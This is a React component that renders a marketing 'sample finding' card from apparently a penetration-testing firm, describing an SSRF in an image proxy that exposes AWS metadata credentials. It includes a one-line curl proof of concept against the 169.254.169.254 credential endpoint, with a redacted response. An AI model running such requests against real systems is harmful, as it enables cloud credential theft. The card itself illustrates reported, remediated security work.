"use client";

import { motion } from "framer-motion";
import { AlertTriangle, ShieldOff, Target, Wrench, FileText } from "lucide-react";

const META = [
  { k: "CVSS 3.1", v: "9.1", accent: "text-red-400" },
  { k: "CVE", v: "CVE-2024-XXXXX", accent: "text-fg" },
  { k: "CWE", v: "CWE-918 SSRF", accent: "text-fg" },
  { k: "MITRE", v: "T1190 / T1552.005", accent: "text-fg" },
];

const TIMELINE = [
  { t: "Found", v: "Day 6 · authenticated scan + manual recon", icon: AlertTriangle, accent: "text-amber-300" },
  { t: "Validated", v: "Day 7 · PoC executed in isolated tenant", icon: Target, accent: "text-red-400" },
  { t: "Reported", v: "Day 9 · CERT-In format · risk register updated", icon: FileText, accent: "text-neon-cyan" },
  { t: "Re-tested", v: "Day 21 · fix verified · closure letter issued", icon: Wrench, accent: "text-emerald-400" },
];

export function SampleFindingCard() {
  return (
    <motion.div
      initial={{ opacity: 0, y: 24 }}
      whileInView={{ opacity: 1, y: 0 }}
      viewport={{ once: true }}
      transition={{ duration: 0.6 }}
      className="relative rounded-3xl glass-strong overflow-hidden"
    >
      {/* severity strip */}
      <div className="h-1 w-full bg-gradient-to-r from-red-500 via-red-400 to-amber-400" />

      <div className="p-7">
        {/* header */}
        <div className="flex items-start justify-between gap-4">
          <div className="min-w-0">
            <div className="flex items-center gap-2 font-mono text-[10px] uppercase tracking-[0.22em] text-red-300">
              <ShieldOff className="size-3.5" />
              Critical · validated · weaponised
            </div>
            <h3 className="mt-2 font-display text-xl font-black text-fg leading-tight">
              SSRF in image-proxy → AWS instance metadata exposure
            </h3>
            <p className="mt-2 text-sm text-fg-muted leading-relaxed">
              The internal image-resize service accepts a user-controlled URL parameter,
              fetches it server-side, and returns the body. Pointing the URL at the EC2
              metadata endpoint (<code className="font-mono text-xs text-neon-cyan">169.254.169.254</code>)
              returns IAM credentials with <code className="font-mono text-xs text-fg">s3:*</code>
              and <code className="font-mono text-xs text-fg">kms:Decrypt</code> permissions.
            </p>
          </div>
          <div className="grid size-14 place-items-center rounded-xl bg-red-500/10 ring-1 ring-red-400/40 text-red-400 shrink-0">
            <span className="font-display text-2xl font-black">9.1</span>
          </div>
        </div>

        {/* meta grid */}
        <div className="mt-6 grid grid-cols-2 sm:grid-cols-4 gap-2">
          {META.map((m) => (
            <div
              key={m.k}
              className="rounded-lg ring-1 ring-line bg-bg/60 px-3 py-2"
            >
              <div className="font-mono text-[9px] uppercase tracking-[0.2em] text-fg-faint">
                {m.k}
              </div>
              <div className={`mt-0.5 font-mono text-sm font-bold ${m.accent}`}>
                {m.v}
              </div>
            </div>
          ))}
        </div>

        {/* exploit code */}
        <div className="mt-5 rounded-lg ring-1 ring-line bg-bg/80 p-3 font-mono text-[11px] leading-relaxed overflow-x-auto">
          <div className="text-fg-faint mb-1">$ proof-of-concept (curated)</div>
          <pre className="text-emerald-300 whitespace-pre">
{`curl 'https://target/img-proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role'
{"Code":"Success","AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}`}
          </pre>
        </div>

        {/* timeline */}
        <ul className="mt-6 space-y-2">
          {TIMELINE.map((t, i) => {
            const Icon = t.icon;
            return (
              <motion.li
                key={t.t}
                initial={{ opacity: 0, x: -8 }}
                whileInView={{ opacity: 1, x: 0 }}
                viewport={{ once: true }}
                transition={{ delay: 0.2 + i * 0.1, duration: 0.4 }}
                className="flex items-center gap-3"
              >
                <span className={`grid size-7 place-items-center rounded-full bg-bg ring-1 ring-line ${t.accent}`}>
                  <Icon className="size-3.5" />
                </span>
                <span className="font-mono text-[10px] uppercase tracking-wider text-fg-faint w-20 shrink-0">
                  {t.t}
                </span>
                <span className="text-sm text-fg-muted">{t.v}</span>
              </motion.li>
            );
          })}
        </ul>

        {/* footer */}
        <div className="mt-6 pt-5 border-t border-line/60 flex flex-wrap items-center justify-between gap-3 text-xs">
          <span className="text-fg-faint">
            Sample finding · anonymised from a 2025 BFSI engagement
          </span>
          <span className="font-mono text-[10px] uppercase tracking-[0.2em] text-emerald-400 inline-flex items-center gap-1.5">
            <span className="size-1.5 rounded-full bg-emerald-400 animate-pulse" />
            closed · 14-day SLA
          </span>
        </div>
      </div>
    </motion.div>
  );
}
